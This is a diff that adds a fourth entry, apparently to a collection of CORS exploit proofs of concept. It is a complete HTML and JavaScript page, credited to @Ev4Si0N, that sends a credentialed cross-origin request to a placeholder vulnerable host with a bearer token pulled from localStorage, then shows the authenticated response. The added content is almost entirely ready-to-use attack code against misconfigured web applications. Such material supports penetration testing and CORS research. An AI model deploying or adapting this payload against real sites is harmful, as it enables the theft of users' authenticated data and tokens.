@@ -103,3 +103,39 @@ xhttp.send();
 <h3>Extract Authenticate Data</h3><div id="demo">
 <button type="button" onclick="cors()">Exploit</button></div></body></html>
 ```
+**EXPLOIT #4**
+Payload from @Ev4Si0N to exploit Auth BEARER Header vía window.localStorage.getItem
+
+```
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract Data</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = "<p>" + this.responseText + "</p>";
+    }
+  };
+  xhttp.open("GET", "https://IP_web_vulnerable/", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("Authorization", window.localStorage.getItem('Authorization'));
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
+```
+
+
+
